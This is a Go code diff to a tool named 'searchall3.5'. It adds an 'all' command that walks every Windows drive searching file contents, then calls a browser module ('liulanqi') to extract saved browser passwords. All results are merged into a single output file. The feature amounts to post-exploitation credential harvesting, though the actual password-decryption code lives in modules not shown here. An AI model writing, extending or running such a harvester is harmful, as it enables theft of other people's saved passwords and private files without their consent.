@@ -2,11 +2,15 @@ package flagsearch
 
 import (
 	"fmt"
+	"os"
+	"path/filepath"
+	"strings"
+
 	"github.com/urfave/cli/v2"
+	"searchall3.5/All"
 	"searchall3.5/search"
 	"searchall3.5/tuozhan/liulanqi"
 	"searchall3.5/tuozhan/liulanqi/browser"
-	"strings"
 )
 
 func Banner() {
@@ -98,7 +102,7 @@ func FlagSearchall() {
 						char = char
 					}
 
-					search.Searchall(searchPath, userRegexList, userOnlyFlag, userExtension, userOnlyExten, size, char)
+					search.Searchall(searchPath, userRegexList, userOnlyFlag, userExtension, userOnlyExten, size, char, "")
 				} else {
 					cli.ShowSubcommandHelp(c)
 				}
@@ -139,6 +143,79 @@ func FlagSearchall() {
 				} else {
 					cli.ShowSubcommandHelp(c)
 				}
+				return nil
+			},
+		},
+		{
+			Name:  "all",
+			Usage: "Search for files and browser password",
+			Flags: []cli.Flag{
+				&cli.StringFlag{
+					Name:  "o",
+					Usage: "Output file path (default: all_result.txt)",
+					Value: "all_result.txt",
+				},
+				&cli.Int64Flag{
+					Name:  "size",
+					Usage: "file size limit in bytes(Default 3M)",
+					Value: 3 * 1024 * 1024,
+				},
+				&cli.IntFlag{
+					Name:  "char",
+					Usage: "character limit(Default 200)",
+					Value: 200,
+				},
+				&cli.StringFlag{
+					Name:  "e",
+					Usage: "Custom extension",
+				},
+			},
+			Action: func(c *cli.Context) error {
+				outputFile := c.String("o")
+				size := c.Int64("size")
+				char := c.Int("char")
+				userExtension := c.String("e")
+
+				// 清空或创建输出文件，写入标题头
+				file, err := os.Create(outputFile)
+				if err != nil {
+					fmt.Println("Error creating output file:", err)
+					return err
+				}
+				file.WriteString("================================================================================\n")
+				file.WriteString("                          SearchAll - ALL Results\n")
+				file.WriteString("================================================================================\n\n")
+				file.WriteString("                          File Search Results\n")
+				file.WriteString("--------------------------------------------------------------------------------\n\n")
+				file.Close()
+
+				// 获取所有盘符
+				drives := All.GetWindowsDrives()
+				fmt.Printf("Found %d drives: %v\n", len(drives), drives)
+
+				// 对每个盘符执行 search，直接写入目标文件
+				fmt.Println("\n[1/2] Starting file search on all drives...")
+				for i, drive := range drives {
+					fmt.Printf("\n--- Searching drive %s (%d/%d) ---\n", drive, i+1, len(drives))
+					search.Searchall(drive, nil, false, userExtension, false, size, char, outputFile)
+				}
+
+				// 执行浏览器密码获取
+				fmt.Println("\n[2/2] Starting browser password extraction...")
+				liulanqi.Execute("all", "")
+
+				// 将浏览器结果追加到输出文件
+				err = All.AppendBrowserResultsToFile(outputFile)
+				if err != nil {
+					fmt.Println("Error appending browser results:", err)
+				}
+
+				// 获取输出文件绝对路径
+				absPath, _ := filepath.Abs(outputFile)
+				fmt.Printf("\n================================================================================\n")
+				fmt.Printf("ALL tasks completed! Results saved to: %s\n", absPath)
+				fmt.Printf("================================================================================\n")
+
 				return nil
 			},
 		},
